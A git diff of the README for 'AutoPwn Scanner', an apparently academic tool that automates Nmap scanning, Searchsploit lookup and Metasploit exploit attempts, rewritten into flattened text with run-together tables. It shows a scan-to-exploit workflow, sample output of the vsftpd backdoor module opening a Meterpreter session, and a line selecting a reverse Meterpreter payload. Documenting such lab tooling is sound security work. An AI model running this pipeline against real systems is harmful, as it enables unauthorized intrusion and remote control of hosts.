@@ -1,265 +1,198 @@
 <img width="1181" height="857" alt="Screenshot_20260506_215458" src="https://github.com/user-attachments/assets/93d82d4d-0cf9-435b-ba1f-dcc66d9bb72f" />
-# 🔍 AutoPwn Scanner
+🔍 AutoPwn Scanner
 
-> Automated vulnerability scanning and exploitation pipeline for authorized lab environments.  
-> **C++ runner · Python logic · Metasploit RPC · SQLite reporting**
+Automated vulnerability scanning and exploitation pipeline for authorized lab environments.
+C++ CLI · Python logic · Metasploit RPC · SQLite reporting
 
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![Platform](https://img.shields.io/badge/platform-Kali%20%7C%20Parrot-darkgreen)
-![Status](https://img.shields.io/badge/status-academic%20project-orange)
+Show Image
+Show Image
+Show Image
+Show Image
+Show Image
 
----
 
-> ⚠️ **DISCLAIMER — ETHICAL AND LEGAL USE ONLY**  
-> This tool was developed exclusively for academic lab environments, CTF competitions, and networks for which you have **explicit written authorization**.  
-> Unauthorized use against third-party systems is illegal under applicable computer crime laws.  
-> The authors accept no responsibility for misuse.
+⚠️ DISCLAIMER — ETHICAL AND LEGAL USE ONLY
+This tool was developed exclusively for academic lab environments, CTF competitions,
+and networks for which you have explicit written authorization.
+Unauthorized use against third-party systems is illegal under applicable computer crime laws.
+The authors accept no responsibility for misuse.
 
----
 
-## Table of Contents
+Table of Contents
 
-- [Overview](#overview)
-- [Architecture](#architecture)
-- [Project Structure](#project-structure)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Database](#database)
-- [Session Monitor](#session-monitor)
-- [Sample Output](#sample-output)
-- [Extending the Tool](#extending-the-tool)
+Overview
+Architecture
+Project Structure
+Requirements
+Installation
+Configuration
+CLI Reference
+Workspaces
+Session Monitor
+Export & Reporting
+Database Schema
+Sample Output
+Extending the Tool
 
----
 
-## Overview
+Overview
+AutoPwn Scanner is an offensive security pipeline that integrates three standard
+penetration testing tools into a single automated workflow, wrapped in a
+Metasploit-style interactive CLI written entirely in C++.
+PhaseToolPurpose0ping / whoisPre-scan reachability check and recon1NmapPort scanning + service version detection2SearchsploitPublic exploit lookup for discovered services3Metasploit RPCAutomatic module loading and exploit attempts4SQLite + exportPersistent storage, CSV and HTML reports
+What makes v3 different
+Featurev1v2v3Interactive CLImenu-basedmsfconsole-style✓ fullRandom ASCII banners✗✓ 6 banners✓ 6 bannersTab autocomplete + history✗✓ readline✓ readlineProgress bar✗✓✓ animated braille spinnerFormatted Unicode tables✗✓✓ enhancedSection dividers✗basic✓ box-styleElapsed time per command✗✗✓Severity highlighting✗✗✓ CRIT/MED/LOWset / show options✗✓✓Workspaces✗✓✓ enhancedping pre-check✗✗✓whois recon✗✗✓export CSV / HTML✗✗✓ dark-themed HTMLhistory command✗✗✓ timestampedstatus panel✗✗✓--quiet / --version✗✗✓SIGINT handled (Ctrl+C)✗✗✓IP/CIDR validation✗✗✓Per-tool timeouts✗✓✓Session log per run✗✓✓
 
-**AutoPwn Scanner** is an offensive security pipeline that integrates three standard penetration testing tools into a single automated workflow:
+Architecture
+┌──────────────────────────────────────────────────────────────────┐
+│                  scanner_runner  (C++ v3)                         │
+│                                                                   │
+│  ┌──────────────────────────────────────────────────────────┐    │
+│  │  Interactive CLI  —  autopwn (workspace/target) >        │    │
+│  │  readline: Tab autocomplete · ↑↓ history · SIGINT guard  │    │
+│  └──────────┬──────────────────────────────────┬────────────┘    │
+│             │                                  │                  │
+│   ┌─────────▼──────────┐           ┌──────────▼──────────┐      │
+│   │  Recon             │           │  Configuration       │      │
+│   │  ping · whois      │           │  set · show · config │      │
+│   └────────────────────┘           │  workspace · history │      │
+│                                    │  status · export     │      │
+│   ┌────────────────────┐           └─────────────────────-┘      │
+│   │  NmapRunner        │                                          │
+│   │  progress bar      │──▶ scan_<IP>.xml                        │
+│   │  elapsed timer     │                                          │
+│   └─────────┬──────────┘                                          │
+│             │                                                      │
+│   ┌─────────▼──────────┐                                          │
+│   │  SearchsploitRunner│──▶ searchsploit_results.json             │
+│   │  severity colors   │    CRIT red · MED yellow · LOW grey      │
+│   └─────────┬──────────┘                                          │
+│             │                                                      │
+└─────────────┼────────────────────────────────────────────────────┘
+              │
+┌─────────────▼────────────────────────────────────────────────────┐
+│                     logic_mapper.py                               │
+│                                                                   │
+│  NmapParser  ·  SearchsploitFilter  ·  MetasploitManager         │
+│                         │                                         │
+│              ┌──────────▼──────────┐                             │
+│              │  MeterpreterMonitor  │  ← background thread        │
+│              │  ★ banner on session │                             │
+│              └──────────┬──────────┘                             │
+│                         │                                         │
+│              ┌──────────▼──────────┐                             │
+│              │     SQLite DB        │                             │
+│              │  Targets             │                             │
+│              │  Vulnerabilities     │──▶ export CSV / HTML        │
+│              │  Exploits_Found      │                             │
+│              └─────────────────────┘                             │
+└──────────────────────────────────────────────────────────────────┘
 
-| Phase | Tool | Purpose |
-|-------|------|---------|
-| 1 | **Nmap** | Port scanning + service version detection |
-| 2 | **Searchsploit** | Public exploit lookup for discovered services |
-| 3 | **Metasploit RPC** | Automatic module loading and exploit attempts |
-
-Every result is persisted to a local **SQLite** database, and Meterpreter sessions are notified in real time by a background monitor thread.
-
----
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                   scanner_runner  (C++)                       │
-│                                                              │
-│   ┌──────────┐    ┌─────────────┐    ┌──────────────────┐   │
-│   │   Nmap   │───▶│ scan_IP.xml │───▶│  Searchsploit    │   │
-│   └──────────┘    └─────────────┘    └────────┬─────────┘   │
-│                                               │ JSON         │
-└───────────────────────────────────────────────┼─────────────┘
-                                                │
-                         ┌──────────────────────▼────────────┐
-                         │         logic_mapper.py            │
-                         │                                    │
-                         │  ┌────────────┐ ┌──────────────┐  │
-                         │  │ NmapParser │ │ SSFilter     │  │
-                         │  └─────┬──────┘ └──────┬───────┘  │
-                         │        └────────┬────────┘         │
-                         │         ┌───────▼───────┐          │
-                         │         │ MetasploitMgr │◀─msfrpcd │
-                         │         └───────┬───────┘          │
-                         │         ┌───────▼───────┐          │
-                         │         │   SQLite DB   │          │
-                         │         └───────────────┘          │
-                         │                                    │
-                         │  ┌─────────────────────────────┐  │
-                         │  │ MeterpreterMonitor (thread) │  │
-                         │  └─────────────────────────────┘  │
-                         └────────────────────────────────────┘
-```
-
----
-
-## Project Structure
-
-```
+Project Structure
 autopwn-scanner/
-├── scanner_runner.cpp        # C++ runner: launches Nmap, Searchsploit, and Python
-├── logic_mapper.py           # Python core: XML parsing, MSF filter, RPC, monitor
-├── db_report.py              # Human-readable SQLite report
-├── start_msfrpcd.sh          # Helper script to start the Metasploit RPC daemon
-├── config.ini.example        # Configuration template (config.ini is in .gitignore)
-├── requirements.txt          # Python dependencies
-├── results/                  # Created at runtime (excluded from git)
-│   ├── scan_<IP>.xml
-│   ├── searchsploit_results.json
-│   └── scanner.db
-└── README.md
-```
+├── scanner_runner.cpp        # C++ CLI — all interaction and orchestration
+├── logic_mapper.py           # Python core — XML parsing, MSF RPC, monitor
+├── db_report.py              # Human-readable SQLite terminal report
+├── start_msfrpcd.sh          # Helper to start the Metasploit RPC daemon
+├── config.ini.example        # Configuration template (config.ini in .gitignore)
+├── requirements.txt          # Python dependencies (pymetasploit3)
+├── .gitignore                # Excludes config.ini, results/, binaries, logs/
+├── README.md
+└── results/                  # Created at runtime — excluded from git
+    └── ws_<workspace>/
+        ├── scan_<IP>.xml
+        ├── searchsploit_results.json
+        ├── export_<timestamp>.csv
+        └── export_<timestamp>.html
+logs/
+    └── session_<timestamp>.log
 
----
+Requirements
+DependencyMin versionNotesOSKali Linux / Parrot / ArchAny Linux with the tools belowPython3.10+For list[dict] type hintsGCC/G++9+Must support -std=c++17Nmap7.80+With vulners NSE scriptMetasploit Framework6.xmsfconsole, msfrpcdSearchsploit / ExploitDBanysudo pacman -S exploitdb / sudo apt install exploitdbreadline (optional)anyEnables Tab + ↑↓ history in the CLIsqlite3 (optional)anyRequired for export csv
 
-## Requirements
+Installation
+bash# 1. Clone the repository
+git clone https://github.com/PIXELQUADRO07/AutoPwn-Scanner.git
+cd AutoPwn-Scanner
 
-| Dependency | Minimum version | Notes |
-|------------|----------------|-------|
-| OS | Kali Linux / Parrot OS | Recommended; works on any Debian-based distro |
-| Python | 3.10+ | Required for `list[dict]` type hints |
-| GCC/G++ | 9+ | Must support `-std=c++17` |
-| Nmap | 7.80+ | With `vulners` script included |
-| Metasploit Framework | 6.x | `msfconsole`, `msfrpcd` |
-| Searchsploit / ExploitDB | any | `sudo apt install exploitdb` |
-
----
-
-## Installation
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/<your-username>/autopwn-scanner.git
-cd autopwn-scanner
-
-# 2. Install Python dependencies
+# 2. Install Python dependency
 pip install -r requirements.txt
 
-# 3. Compile the C++ runner
+# 3a. Compile WITHOUT readline (basic input)
 g++ -o scanner_runner scanner_runner.cpp -std=c++17
 
-# 4. Copy and customize the configuration
+# 3b. Compile WITH readline (Tab autocomplete + ↑↓ history) — recommended
+sudo pacman -S readline          # Arch / Kali
+# sudo apt install libreadline-dev  # Debian / Kali apt
+g++ -o scanner_runner scanner_runner.cpp -std=c++17 -lreadline
+
+# 4. Set up configuration
 cp config.ini.example config.ini
-nano config.ini
-```
+nano config.ini    # set your msfrpcd password and paths
 
----
-
-## Configuration
-
-All sensitive settings live in `config.ini` (never committed to Git):
-
-```ini
-[metasploit]
-password = change_this_password
-host     = 127.0.0.1
-port     = 55553
+Configuration
+All sensitive settings live in config.ini — never committed to Git.
+ini[metasploit]
+msf_password        = change_this_password
+msf_host            = 127.0.0.1
+msf_port            = 55553
 
 [scanner]
 output_dir          = ./results
-monitor_interval    = 5    # seconds between each polling cycle
-post_pipeline_wait  = 10   # extra seconds after pipeline for slow staged payloads
+monitor_interval    = 5      # seconds between session polls
+post_pipeline_wait  = 10     # extra wait after pipeline for slow payloads
+
+[timeouts]
+timeout_nmap        = 600    # seconds; 0 = no timeout
+timeout_searchsploit= 60
+timeout_msf         = 120
 
 [database]
-path = ./results/scanner.db
-```
+db_path             = ./results/scanner.db
 
-> Only `config.ini.example` (with placeholder values) should be committed.  
-> **Never commit `config.ini` containing your real password.**
+[workspace]
+workspace           = default
+log_dir             = ./logs
+You can also change any option live inside the CLI without restarting:
+autopwn (default) > set timeout_nmap 300
+autopwn (default) > set workspace lab_01
+autopwn (default) > show
 
----
+CLI Reference
+Starting the CLI
+bash# Interactive mode
+./scanner_runner
 
-## Usage
+# Direct (non-interactive) mode
+./scanner_runner <command> [args]
 
-### Step 1 — Start the Metasploit RPC daemon
+# Flags
+./scanner_runner --quiet      # suppress verbose output
+./scanner_runner --version    # print version table and exit
+./scanner_runner help         # print command reference
+Command Reference
+CommandArgumentsDescriptionping<target>Check host reachability before scanningwhois<target>Domain / IP reconscan<target>Full pipeline: nmap → searchsploit → msfnmap<target>Run Nmap onlysessionsList active Metasploit sessionskill<session_id>Terminate a Metasploit sessionreportDisplay SQLite report in terminalexportcsv | htmlExport results to fileset<option> <value>Change any option on the flyshowShow all current options in a tableconfigInteractive configuration wizardworkspacelist|new|use|delete [name]Manage workspaceshistoryShow command history with timestampsstatusLive status panelbannerPrint a new random ASCII bannerversionVersion and build infohelpFull command referenceexitQuit
+Typical workflow
+autopwn (default) > ping 192.168.1.50
+autopwn (default) > workspace new lab_metasploitable
+autopwn (lab_metasploitable) > scan 192.168.1.50
+autopwn (lab_metasploitable/192.168.1.50) > sessions
+autopwn (lab_metasploitable/192.168.1.50) > export html
+autopwn (lab_metasploitable/192.168.1.50) > report
 
-```bash
-# In a separate terminal
-bash start_msfrpcd.sh
+Workspaces
+Every scan is isolated inside a workspace folder so multiple targets
+never mix data.
+autopwn > workspace new lab_01        # create and switch
+autopwn > workspace list              # list all with status
+autopwn > workspace use lab_02        # switch to existing
+autopwn > workspace delete lab_01     # delete (cannot delete 'default')
+Each workspace stores its own XML, JSON, and export files under
+results/ws_<name>/.
 
-# Or manually
-msfrpcd -P change_this_password -n -f -a 127.0.0.1 -p 55553
-```
-
-### Step 2 — Run the pipeline
-
-```bash
-# Single target (sudo required for Nmap raw sockets)
-sudo ./scanner_runner 192.168.1.10
-
-# CIDR network range
-sudo ./scanner_runner 192.168.1.0/24
-```
-
-The C++ runner executes in sequence:
-1. `nmap -sV --script=vulners -oX results/scan_<IP>.xml <target>`
-2. `searchsploit --nmap results/scan_<IP>.xml -j → results/searchsploit_results.json`
-3. `python3 logic_mapper.py --xml ... --json ...`
-
-In interactive mode, use `clear` or `cls` to reset the terminal screen.
-
-### Interactive CLI commands
-
-Within `./scanner_runner` interactive mode you can also use:
-
-- `searchsploit <xml_or_target>` — run Searchsploit against an existing Nmap XML file or named target.
-- `exploit list [query]` — list Metasploit exploit modules from `msfconsole`.
-- `exploit show [module]` — show details for the selected exploit or a specified module.
-- `exploit select <module>` — choose a module for later execution.
-- `exploit run <target> [rport] [module]` — execute the selected or specified exploit module.
-- `msf list [query]` — alias for `exploit list`.
-
-### Step 3 — View results
-
-```bash
-python3 db_report.py
-
-# With a custom database path
-python3 db_report.py ./results/scanner.db
-```
-
-### Advanced options for `logic_mapper.py`
-
-```
-python3 logic_mapper.py --xml <file.xml> --json <file.json> [--monitor-interval SEC]
-
-  --xml               Path to the Nmap XML output file
-  --json              Path to the Searchsploit JSON output file
-  --monitor-interval  Seconds between session monitor polls (default: 5)
-```
-
----
-
-## Database
-
-The SQLite database at `results/scanner.db` contains three tables:
-
-```sql
-Targets
-  id · ip · hostname · os_info · scan_time
-
-Vulnerabilities
-  id · target_id → Targets
-  port · protocol · service · version
-  exploit_name · exploit_path · has_msf · found_time
-
-Exploits_Found
-  id · vuln_id → Vulnerabilities
-  msf_module · rhost · rport
-  session_id · success · attempt_time
-```
-
-Quick query examples:
-
-```bash
-# All successful exploits
-sqlite3 results/scanner.db \
-  "SELECT rhost, msf_module, session_id FROM Exploits_Found WHERE success=1;"
-
-# Vulnerabilities with an available MSF module
-sqlite3 results/scanner.db \
-  "SELECT t.ip, v.port, v.service, v.exploit_name
-   FROM Vulnerabilities v JOIN Targets t ON v.target_id=t.id
-   WHERE v.has_msf=1;"
-```
-
----
-
-## Session Monitor
-
-`MeterpreterMonitor` runs as a daemon thread throughout the entire pipeline.  
-When a new session is detected, it prints a colored banner to stdout:
-
-```
+Session Monitor
+MeterpreterMonitor (in logic_mapper.py) runs as a background daemon thread
+during the full pipeline. When a new session opens it prints a colored banner:
 ╔══════════════════════════════════════════════╗
 ║  ★  METERPRETER SESSION                      ║
 ╠══════════════════════════════════════════════╣
@@ -271,74 +204,128 @@ When a new session is detected, it prints a colored banner to stdout:
 ║  Module     : exploits/unix/ftp/vsftpd_234   ║
 ║  Time       : 14:32:07                       ║
 ╚══════════════════════════════════════════════╝
-```
+Session typeIconColormeterpreter★Greenshell✓Yellowother~Cyan
+The session is recorded in the database even if not started by the pipeline.
+After the pipeline finishes, the monitor waits post_pipeline_wait extra seconds
+to catch slow staged payloads before shutting down.
 
-| Session type | Icon | Color |
-|---|---|---|
-| `meterpreter` | ★ | Green |
-| `shell` | ✓ | Yellow |
-| other | ~ | Cyan |
+Export & Reporting
+Terminal report
+bashautopwn > report
+# or directly:
+python3 db_report.py ./results/scanner.db
+CSV export
+autopwn > export csv
+Produces results/ws_<name>/export_<timestamp>.csv with columns:
+ip, hostname, port, service, version, exploit_name, has_msf, success
+HTML export
+autopwn > export html
+Produces a self-contained dark-themed HTML page with a sortable table.
+MSF-compatible exploits are highlighted in green. Open in any browser.
 
-Sessions are automatically recorded in the database even if not launched directly by the pipeline (e.g. a manual exploit running in parallel).
+Database Schema
+sqlTargets
+  id · ip · hostname · os_info · scan_time
 
----
+Vulnerabilities
+  id · target_id → Targets
+  port · protocol · service · version
+  exploit_name · exploit_path · has_msf · found_time
 
-## Sample Output
+Exploits_Found
+  id · vuln_id → Vulnerabilities
+  msf_module · rhost · rport
+  session_id · success · attempt_time
+Quick queries:
+bash# Successful exploits
+sqlite3 results/scanner.db \
+  "SELECT rhost, msf_module, session_id FROM Exploits_Found WHERE success=1;"
 
-```
-==============================================
-   Security Scanner Runner (C++) - Lab
-==============================================
+# All MSF-ready vulnerabilities
+sqlite3 results/scanner.db \
+  "SELECT t.ip, v.port, v.service, v.exploit_name
+   FROM Vulnerabilities v JOIN Targets t ON v.target_id=t.id
+   WHERE v.has_msf=1;"
 
-[NMAP] Starting scan on: 192.168.1.50
-[NMAP] XML output -> ./results/scan_192.168.1.50.xml
-[SEARCHSPLOIT] Parsing XML...
-[PYTHON-BRIDGE] Invoking logic_mapper.py
+Sample Output
+  ██████╗  ██╗    ██╗███╗   ██╗
+  ██╔══██╗ ██║    ██║████╗  ██║
+  ███████║ ██║ █╗ ██║██╔██╗ ██║
+  ██╔══██║ ██║███╗██║██║╚██╗██║
+  ██║  ██║ ╚███╔███╔╝██║ ╚████║
+  [ Nmap · Searchsploit · Metasploit RPC · v3 ]
+  workspace: lab01  |  msf: 127.0.0.1:55553  |  v3.0.0
 
-══════════════════════════════════════════════
-  LOGIC MAPPER – Pipeline started
-══════════════════════════════════════════════
+  Type help for commands. Ctrl+C interrupts running tools.
+  Tab autocomplete and ↑↓ history enabled.
 
+autopwn (lab01) > ping 192.168.1.50
+
+  ┌─ PING ────────────────────────────────────────────┐
+[*] Testing reachability: 192.168.1.50
+  ────────────────────────────────────────────────────
+  PING 192.168.1.50: 4 packets transmitted, 4 received
+  Completed in 4s
+  ────────────────────────────────────────────────────
+[+] 192.168.1.50 is reachable.
+
+autopwn (lab01) > scan 192.168.1.50
+
+  ┌─ NMAP SCAN ───────────────────────────────────────┐
+[*] Target    : 192.168.1.50
+[*] Timeout   : 600s
+  ────────────────────────────────────────────────────
+
+  Scanning 192.168.1.50     [████████████████████████░░░░░░░░░░░░░░] 63%  ⠹
+
+  ... nmap output ...
+
+  Scanning 192.168.1.50     [████████████████████████████████████████] DONE
+  Completed in 1m 48s
+[+] Scan complete → ./results/ws_lab01/scan_192.168.1.50.xml
+
+  ┌─ SEARCHSPLOIT ────────────────────────────────────┐
+  Querying exploitdb       [████████████████████████████████████████] DONE
+
+[CRIT]  vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
+[MED]   ProFTPd 1.3.3c - Compromised Source Packages
+[LOW]   ProFTPd IAC 1.3.x - Remote DoS
+  Completed in 3s
+[+] Results → ./results/ws_lab01/searchsploit_results.json
+
+  ┌─ LOGIC MAPPER ────────────────────────────────────┐
+[*] MSF RPC: 127.0.0.1:55553
 [MONITOR] Started. Polling every 5s.
-[DB] Connected to: ./results/scanner.db
-[PARSER] Hosts found: 1
-[MSF] Connected to msfrpcd at 127.0.0.1:55553
+  → Attempting: exploits/unix/ftp/vsftpd_234_backdoor
 
-[MAPPER] Host: 192.168.1.50 (metasploitable) OS: Linux 2.6.x
-  ↳ Port 21/tcp: ftp vsftpd 2.3.4
-    → Attempting MSF: exploits/unix/ftp/vsftpd_234_backdoor
-[MSF] Launching: exploits/unix/ftp/vsftpd_234_backdoor → 192.168.1.50:21
+╔══════════════════════════════════════════════╗
+║  ★  METERPRETER SESSION                      ║
+║  Session ID : 1   Target: 192.168.1.50       ║
+╚══════════════════════════════════════════════╝
 
-★  METERPRETER SESSION  [ID: 1 | 192.168.1.50]  ★
+[+] Logic mapper completed.  Completed in 12s
 
-[MAPPER] Waiting 10s for delayed sessions...
-[MONITOR] Stopped.
-[MAPPER] Pipeline complete. Data saved to DB.
-```
+autopwn (lab01/192.168.1.50) > export html
+[+] HTML exported → ./results/ws_lab01/export_20260513_143207.html
 
----
+autopwn (lab01/192.168.1.50) > history
 
-## Extending the Tool
+  ╔═══╦══════════╦══════════════════════════════╗
+  ║ # ║ Time     ║ Command                      ║
+  ╠═══╬══════════╬══════════════════════════════╣
+  ║ 1 ║ 14:28:01 ║ ping 192.168.1.50            ║
+  ║ 2 ║ 14:28:07 ║ scan 192.168.1.50            ║
+  ║ 3 ║ 14:32:10 ║ export html                  ║
+  ╚═══╩══════════╩══════════════════════════════╝
 
-**Custom Nmap flags** — edit `NmapRunner::run()` in `scanner_runner.cpp`:
-```cpp
-// Full port scan with OS detection
-"nmap -A -p- --script=vulners -oX " + output_xml + " " + target
-```
-
-**Different Metasploit payload** — edit `MetasploitManager.run_exploit()`:
-```python
-# Switch to a stageless Windows x64 Meterpreter
-payload = self.client.modules.use("payload", "windows/x64/meterpreter_reverse_tcp")
-```
-
-**External notifications from MeterpreterMonitor** — extend `_notify()`:
-```python
-import requests
-requests.post("https://hooks.slack.com/...", json={"text": f"Session opened on {rhost}!"})
-```
-
-**Export report as JSON**:
-```python
-# In db_report.py, replace print() with json.dump() for machine-readable output
-```
+Extending the Tool
+Custom Nmap flags — edit NmapRunner::run() in scanner_runner.cpp:
+cpp// Full port scan with OS detection
+"nmap -A -p- --script=vulners -oX " + xml + " " + target
+Different Metasploit payload — edit MetasploitManager.run_exploit() in logic_mapper.py:
+pythonpayload = self.client.modules.use("payload", "windows/x64/meterpreter_reverse_tcp")
+Slack / webhook notifications — extend MeterpreterMonitor._notify():
+pythonimport requests
+requests.post("https://hooks.slack.com/...", json={"text": f"★ Session on {rhost}"})
+Add a new CLI command — add a branch in dispatch() in scanner_runner.cpp:
+cppif (cmd == "mycommand") { my_function(a1, cfg, log); return 0; }
